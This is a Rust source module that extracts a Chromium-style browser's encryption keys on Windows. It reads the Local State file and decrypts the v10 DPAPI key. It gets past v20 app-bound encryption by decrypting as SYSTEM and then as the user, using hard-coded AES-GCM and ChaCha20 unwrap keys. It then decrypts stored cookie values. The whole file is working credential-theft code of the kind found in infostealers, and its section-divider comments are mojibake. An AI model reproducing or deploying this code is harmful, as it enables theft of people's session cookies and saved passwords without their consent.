#![cfg(target_os = "windows")]
//! Browser key extraction: v10 DPAPI keys and v20 app-bound keys.

use super::browser_ffi::dpapi_unprotect;
use super::base64_decode;

// 鈹€鈹€ v10 DPAPI Key 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€

#[cfg(target_os = "windows")]
pub(super) fn extract_v10_key(ls_path: &std::path::Path) -> Option<Vec<u8>> {
    let json = std::fs::read_to_string(ls_path).ok()?;
    let doc: serde_json::Value = serde_json::from_str(&json).ok()?;
    let ek = doc.get("os_crypt")?.get("encrypted_key")?.as_str()?;
    let raw = base64_decode(ek)?;
    if raw.len() < 5 || &raw[..5] != b"DPAPI" {
        return None;
    }
    dpapi_unprotect(&raw[5..])
}

// 鈹€鈹€ v20 App-Bound Key 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€

#[cfg(target_os = "windows")]
pub(super) fn extract_v20_key(ls_path: &std::path::Path) -> Option<Vec<u8>> {
    let json = std::fs::read_to_string(ls_path).ok()?;
    let doc: serde_json::Value = serde_json::from_str(&json).ok()?;
    let ak = doc.get("os_crypt")?.get("app_bound_encrypted_key")?.as_str()?;
    get_app_bound_master_key(ak)
}

#[cfg(target_os = "windows")]
fn get_app_bound_master_key(base64: &str) -> Option<Vec<u8>> {
    let raw = base64_decode(base64)?;
    if raw.len() < 5 || &raw[..4] != b"APPB" {
        return None;
    }
    let sys_dec = super::browser_ffi::dpapi_decrypt_as_system(&raw[4..])?;
    let user_dec = dpapi_unprotect(&sys_dec)?;
    parse_key_blob(&user_dec)
}

// 鈹€鈹€ Key Blob Parsing 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€

#[cfg(target_os = "windows")]
fn parse_key_blob(blob: &[u8]) -> Option<Vec<u8>> {
    if blob.len() < 8 {
        return None;
    }
    let hdr_len = i32::from_le_bytes([blob[0], blob[1], blob[2], blob[3]]) as usize;
    let off = 4 + hdr_len;
    if off + 4 > blob.len() {
        return None;
    }
    let content_len = i32::from_le_bytes([blob[off], blob[off+1], blob[off+2], blob[off+3]]) as usize;
    let data_start = off + 4;
    if data_start + content_len > blob.len() {
        return None;
    }
    let c = &blob[data_start..data_start + content_len];

    if c.len() == 32 {
        return Some(c.to_vec());
    }
    if c.len() < 61 {
        return None;
    }

    let flag = c[0];
    let iv = &c[1..13];
    let tag = &c[c.len() - 16..];
    let ct = &c[13..c.len() - 16];

    match flag {
        1 => aes_gcm_decrypt_raw(AES_GCM_FLAG1_KEY, iv, ct, tag),
        2 => chacha20_decrypt_raw(CHACHA20_KEY, iv, ct, tag),
        _ => None,
    }
}

const AES_GCM_FLAG1_KEY: &[u8] = &[
    0xB3,0x1C,0x6E,0x24,0x1A,0xC8,0x46,0x72,0x8D,0xA9,0xC1,0xFA,0xC4,0x93,0x66,0x51,
    0xCF,0xFB,0x94,0x4D,0x14,0x3A,0xB8,0x16,0x27,0x6B,0xCC,0x6D,0xA0,0x28,0x47,0x87,
];

const CHACHA20_KEY: &[u8] = &[
    0xE9,0x8F,0x37,0xD7,0xF4,0xE1,0xFA,0x43,0x3D,0x19,0x30,0x4D,0xC2,0x25,0x80,0x42,
    0x09,0x0E,0x2D,0x1D,0x7E,0xEA,0x76,0x70,0xD4,0x1F,0x73,0x8D,0x08,0x72,0x96,0x60,
];

// 鈹€鈹€ AES-GCM Decryption 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€

#[cfg(target_os = "windows")]
pub(super) fn decrypt_aes_gcm(encrypted: &[u8], key: &[u8], is_cookie: bool) -> Option<String> {
    use aes_gcm::{Aes256Gcm, Nonce, KeyInit, aead::Aead};

    // Determine version prefix
    let ver = if encrypted.len() >= 3 { &encrypted[..3] } else { b"???" };
    let is_v20 = ver == b"v20";

    let nonce = Nonce::from_slice(&encrypted[3..15]);
    let tag_start = encrypted.len() - 16;
    let ct = &encrypted[15..tag_start];
    let tag = &encrypted[tag_start..];

    let cipher = Aes256Gcm::new_from_slice(key).ok()?;
    let mut combined = ct.to_vec();
    combined.extend_from_slice(tag);
    let plaintext = cipher.decrypt(nonce, combined.as_slice()).ok()?;

    // v10 cookies have a 32-byte nonce prefix before the actual value
    // v20 cookies do NOT have this prefix 鈥?the plaintext IS the value
    if is_cookie && !is_v20 && plaintext.len() > 32 {
        Some(String::from_utf8_lossy(&plaintext[32..]).to_string())
    } else {
        Some(String::from_utf8_lossy(&plaintext).to_string())
    }
}

#[cfg(target_os = "windows")]
fn aes_gcm_decrypt_raw(key: &[u8], iv: &[u8], ct: &[u8], tag: &[u8]) -> Option<Vec<u8>> {
    use aes_gcm::{Aes256Gcm, Nonce, KeyInit, aead::Aead};

    let cipher = Aes256Gcm::new_from_slice(key).ok()?;
    let nonce = Nonce::from_slice(iv);
    let mut combined = ct.to_vec();
    combined.extend_from_slice(tag);
    cipher.decrypt(nonce, combined.as_slice()).ok()
}

#[cfg(target_os = "windows")]
fn chacha20_decrypt_raw(key: &[u8], iv: &[u8], ct: &[u8], tag: &[u8]) -> Option<Vec<u8>> {
    use chacha20poly1305::{ChaCha20Poly1305, Nonce, KeyInit, aead::Aead};

    let cipher = ChaCha20Poly1305::new_from_slice(key).ok()?;
    let nonce = Nonce::from_slice(iv);
    let mut combined = ct.to_vec();
    combined.extend_from_slice(tag);
    cipher.decrypt(nonce, combined.as_slice()).ok()
}
